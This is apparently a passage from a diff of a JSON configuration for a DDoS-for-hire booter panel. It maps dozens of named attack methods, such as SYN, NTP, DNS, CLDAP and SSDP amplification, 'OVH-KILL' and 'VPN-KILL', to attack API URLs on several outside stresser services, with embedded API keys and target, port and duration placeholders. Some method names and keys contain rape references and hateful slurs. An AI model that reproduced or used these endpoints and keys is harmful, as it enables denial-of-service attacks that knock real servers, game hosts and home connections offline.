+               "AttackName" : "MIXEDHOME",
+               "Description" : "",
+               "API" : "https://api-casper.xyz/AllAPI.php?key=modzontop!-lifetime-until5&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "syn-home",
+               "AttackName" : "SYN-HOME",
+               "Description" : "",
+               "API" : "https://api-casper.xyz/AllAPI.php?key=modzontop!-lifetime-until5&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "http-freezev2",
+               "AttackName" : "HTTP-FREEZEV2",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "error-game",
+               "AttackName" : "ERROR-GAME",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+
+               "Name" : "2k-crash",
+               "AttackName" : "2K-CRASH",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {  
+               "Name" : "ark-255",
+               "AttackName" : "ARK-255",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "dvr",
+               "AttackName" : "DVR",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "error-ovh",
+               "AttackName" : "ERROR-OVH",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "ovh-down",
+               "AttackName" : "OVH-DOWN",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "ovh-error",
+               "AttackName" : "OVH-ERROR",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=OVH-KILL",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+
+               "Name" : "ovh-tcp",
+               "AttackName" : "OVH-TCP",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "error-100up",
+               "AttackName" : "ERROR-100UP",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "100up-mix",
+               "AttackName" : "100UP-MIX",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true 
+          },
+          {
+               "Name" : "error-nfo",
+               "AttackName" : "ERROR-NFO",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "wra",
+               "AttackName" : "WRA",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "http-stun",
+               "AttackName" : "HTTP-STUN",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "http-get",
+               "AttackName" : "HTTP-GET",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "http-bypass",
+               "AttackName" : "HTTP-BYPASS",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "http-plague",
+               "AttackName" : "HTTP-PLAGUE",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+              "Name" : "killall",
+               "AttackName" : "KILLALL",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "killall-v2",
+               "AttackName" : "KILLALL-V2",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "vpn-kill",
+               "AttackName" : "VPN-KILL",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "stun",
+               "AttackName" : "STUN",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "20gbpsudp",
+               "AttackName" : "20GBPSUDP",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "bermuda",
+               "AttackName" : "BERMUDA",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=BERMUDA-TRIANGLE",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "redsyn",
+               "AttackName" : "REDSYN",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "redsyn-v2",
+               "AttackName" : "REDSYN-V2",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "rail",
+               "AttackName" : "RAIL",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "ssdp",
+               "AttackName" : "SSDP",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+                "Name" : "home-gone",
+               "AttackName" : "HOME-GONE",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "ntp",
+               "AttackName" : "NTP",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "http",
+               "AttackName" : "http",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "cldap",
+               "AttackName" : "CLDAP",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "dvr",
+               "AttackName" : "DVR",
+               "Description" : "",
+               "API" : "https://errorapi.xyz/api?key=AkazaIsAGodONGONGONGitsokayYAH&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "ntp",
+               "AttackName" : "NTP",
+               "Description" : "",
+               "API" : "https://synapsehub.xyz/stresser/api/api.php?key=OWrWvxdLjFIISGCC&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=NTP",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "dns",
+               "AttackName" : "DNS",
+               "Description" : "",
+               "API" : "https://synapsehub.xyz/stresser/api/api.php?key=OWrWvxdLjFIISGCC&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=DNS",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "snmp",
+               "AttackName" : "SNMP",
+               "Description" : "",
+               "API" : "https://synapsehub.xyz/stresser/api/api.php?key=OWrWvxdLjFIISGCC&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "cldap",
+               "AttackName" : "CLDAP",
+               "Description" : "",
+               "API" : "https://synapsehub.xyz/stresser/api/api.php?key=OWrWvxdLjFIISGCC&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "nfo-bake",
+               "AttackName" : "NFO-BAKE",
+               "Description" : "",
+               "API" : "https://synapsehub.xyz/stresser/api/api.php?key=OWrWvxdLjFIISGCC&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "nfo-synapse",
+               "AttackName" : "NFO-SYNAPSE",
+               "Description" : "",
+               "API" : "https://synapsehub.xyz/stresser/api/api.php?key=OWrWvxdLjFIISGCC&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "nfo-thunder",
+               "AttackName" : "NFO-THUNDER",
+               "Description" : "",
+               "API" : "https://synapsehub.xyz/stresser/api/api.php?key=OWrWvxdLjFIISGCC&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=CLDAP",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ovh-bake",
+               "AttackName" : "OVH-BAKE",
+               "Description" : "",
+               "API" : "https://synapsehub.xyz/stresser/api/api.php?key=OWrWvxdLjFIISGCC&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ovh-synapse",
+               "AttackName" : "OVH-SYNAPSE",
+               "Description" : "",
+               "API" : "https://synapsehub.xyz/stresser/api/api.php?key=OWrWvxdLjFIISGCC&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ovh-thunder",
+               "AttackName" : "OVH-THUNDER",
+               "Description" : "",
+               "API" : "https://synapsehub.xyz/stresser/api/api.php?key=OWrWvxdLjFIISGCC&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "nfo-bake",
+               "AttackName" : "NFO-BAKE",
+               "Description" : "",
+               "API" : "https://synapsehub.xyz/stresser/api/api.php?key=OWrWvxdLjFIISGCC&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ovh-bake",
+               "AttackName" : "OVH-BAKE",
+               "Description" : "",
+               "API" : "https://synapsehub.xyz/stresser/api/api.php?key=OWrWvxdLjFIISGCC&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ovh-synapse",
+               "AttackName" : "OVH-SYNAPSE",
+               "Description" : "",
+               "API" : "https://synapsehub.xyz/stresser/api/api.php?key=OWrWvxdLjFIISGCC&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "dedipath-bake",
+               "AttackName" : "DEDIPATH-BAKE",
+               "Description" : "",
+               "API" : "https://synapsehub.xyz/stresser/api/api.php?key=OWrWvxdLjFIISGCC&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "http-syn",
+               "AttackName" : "HTTP-SYN",
+               "Description" : "",
+               "API" : "https://synapsehub.xyz/stresser/api/api.php?key=OWrWvxdLjFIISGCC&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=KABUSH",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "dvr-s",
+               "AttackName" : "DVR-S",
+               "Description" : "",
+               "API" : "https://synapsehub.xyz/stresser/api/api.php?key=OWrWvxdLjFIISGCC&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=DVR",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ovh-raw",
+               "AttackName" : "OVH-RAW",
+               "Description" : "harvey cute",
+               "API" : "https://api.primitive-api.cc/api.php?key=u9oToZzHgB2fhwXF&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>&threads=1&pps=1000000",
+               "moderation" : {
+                    "LimitMaxTime" : true,
+                    "MaxTime" : 60
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "ovh-raw",
+               "AttackName" : "OVH-RAW",
+               "Description" : "harvey cute",
+               "API" : "https://api.primitive-api.cc/api.php?key=u9oToZzHgB2fhwXF&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>&threads=1&pps=1000000",
+               "moderation" : {
+                    "LimitMaxTime" : true,
+                    "MaxTime" : 60
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "http-prime",
+               "AttackName" : "HTTP-PRIME",
+               "Description" : "harvey cute",
+               "API" : "https://api.primitive-api.cc/api.php?key=u9oToZzHgB2fhwXF&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>&threads=1&pps=1000000",
+               "moderation" : {
+                    "LimitMaxTime" : true,
+                    "MaxTime" : 60
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "ovh-kill",
+               "AttackName" : "OVH-KILL",
+               "Description" : "harvey cute",
+               "API" : "https://api.primitive-api.cc/api.php?key=u9oToZzHgB2fhwXF&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>&threads=1&pps=1000000",
+               "moderation" : {
+                    "LimitMaxTime" : true,
+                    "MaxTime" : 60
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "ovh-rail",
+               "AttackName" : "OVH-RAIL",
+               "Description" : "harvey cute",
+               "API" : "https://api.primitive-api.cc/api.php?key=u9oToZzHgB2fhwXF&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>&threads=1&pps=1000000",
+               "moderation" : {
+                    "LimitMaxTime" : true,
+                    "MaxTime" : 60
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "redsyn-p",
+               "AttackName" : "REDSYN-P",
+               "Description" : "harvey cute",
+               "API" : "https://api.primitive-api.cc/api.php?key=u9oToZzHgB2fhwXF&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=REDSYN&threads=1&pps=1000000",
+               "moderation" : {
+                    "LimitMaxTime" : true,
+                    "MaxTime" : 60
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "nfo-rape",
+               "AttackName" : "NFO-RAPE",
+               "Description" : "harvey cute",
+               "API" : "https://api.primitive-api.cc/api.php?key=u9oToZzHgB2fhwXF&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>&threads=1&pps=1000000",
+               "moderation" : {
+                    "LimitMaxTime" : true,
+                    "MaxTime" : 60
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "nfo-crush",
+               "AttackName" : "NFO-CRUSH",
+               "Description" : "harvey cute",
+               "API" : "https://api.primitive-api.cc/api.php?key=u9oToZzHgB2fhwXF&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>&threads=1&pps=1000000",
+               "moderation" : {
+                    "LimitMaxTime" : true,
+                    "MaxTime" : 60
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "cod-rape",
+               "AttackName" : "COD-RAPE",
+               "Description" : "harvey cute",
+               "API" : "https://api.primitive-api.cc/api.php?key=u9oToZzHgB2fhwXF&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>&threads=1&pps=1000000",
+               "moderation" : {
+                    "LimitMaxTime" : true,
+                    "MaxTime" : 60
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "game-amp",
+               "AttackName" : "GAME-AMP",
+               "Description" : "harvey cute",
+               "API" : "https://api.primitive-api.cc/api.php?key=u9oToZzHgB2fhwXF&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>&threads=1&pps=1000000",
+               "moderation" : {
+                    "LimitMaxTime" : true,
+                    "MaxTime" : 60
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "home-mix",
+               "AttackName" : "HOME-MIX",
+               "Description" : "harvey cute",
+               "API" : "https://api.primitive-api.cc/api.php?key=u9oToZzHgB2fhwXF&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>&threads=1&pps=1000000",
+               "moderation" : {
+                    "LimitMaxTime" : true,
+                    "MaxTime" : 60
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "home-null",
+               "AttackName" : "HOME-NULL",
+               "Description" : "harvey cute",
+               "API" : "https://api.primitive-api.cc/api.php?key=u9oToZzHgB2fhwXF&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>&threads=1&pps=1000000",
+               "moderation" : {
+                    "LimitMaxTime" : true,
+                    "MaxTime" : 60
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "http-eclipse",
+               "AttackName" : "HTTP-ECLIPSE",
+               "Description" : "harvey cute",
+               "API" : "http://195.58.38.10/api.php?key=ECLIPSE-API=ONTOP=0196542&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "home-hold",
+               "AttackName" : "HOME-HOLD",
+               "Description" : "harvey cute",
+               "API" : "http://195.58.38.10/api.php?key=ECLIPSE-API=ONTOP=0196542&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=HOME-HOLDER",
+               "DefaultPort" : "80",
+               "AdminMethod" : false, 
+               "VipMethod" : false
+          },
+          {
+               "Name" : "100up-eclipse",
+               "AttackName" : "100UP-ECLIPSE",
+               "Description" : "harvey cute",
+               "API" : "http://195.58.38.10/api.php?key=ECLIPSE-API=ONTOP=0196542&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "80",
+               "AdminMethod" : false, 
+               "VipMethod" : false
+          },
+          {
+               "Name" : "nfo-eclipse-x",
+               "AttackName" : "NFO-ECLIPSE-X",
+               "Description" : "harvey cute",
+               "API" : "http://195.58.38.10/api.php?key=ECLIPSE-API=ONTOP=0196542&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "80",
+               "AdminMethod" : false, 
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ovh-game",
+               "AttackName" : "OVH-GAME",
+               "Description" : "harvey cute",
+               "API" : "http://195.58.38.10/api.php?key=ECLIPSE-API=ONTOP=0196542&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "80",
+               "AdminMethod" : false, 
+               "VipMethod" : false
+          },
+          {
+               "Name" : "eclipse-hydra",
+               "AttackName" : "ECLIPSE-HYDRA",
+               "Description" : "harvey cute",
+               "API" : "http://195.58.38.10/api.php?key=ECLIPSE-API=ONTOP=0196542&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "80",
+               "AdminMethod" : false, 
+               "VipMethod" : false
+          },
+          {
+               "Name" : "tcp",
+               "AttackName" : "TCP",
+               "Description" : "harvey cute",
+               "API" : "http://136.175.200.91:999/attack?key=harveylikesmenandfactsisastd&target=<<$target>>&port=<<$port>>&duration=<<$duration>>&method=<<$method>>",
+               "moderation" : {
+                    "LimitMaxTime" : true,
+                    "MaxTime" : 60
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "home-udp",
+               "AttackName" : "HOME-UDP",
+               "Description" : "harvey cute",
+               "API" : "http://95.216.111.219/dedi.php?key=harveyisapartofthekkk&host=<<$target>>&port=<<$port>>&duration=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+           {
+               "Name" : "home",
+               "AttackName" : "LKZ-HOME",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "dns",
+               "AttackName" : "LKZ-DNS",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "cldap",
+               "AttackName" : "LKZ-CLDAP",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ntp",
+               "AttackName" : "LKZ-NTP",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "game",
+               "AttackName" : "LKZ-GAME",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "fivem",
+               "AttackName" : "LKZ-FIVEM",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "nfo",
+               "AttackName" : "LKZ-NFO",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ovhv3",
+               "AttackName" : "LKZ-OVHV3",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "openvpn",
+               "AttackName" : "LKZ-OPENVPN",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "udp",
+               "AttackName" : "LKZ-UDP",
+               "Description" : "",
+               "API" : "https://api.leakz.org/fbiVIP.php?key=HoverCore.1337SDGW90GWBFCVN00VV&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "rawsyn",
+               "AttackName" : "LKZ-RAWSYN",
+               "Description" : "",
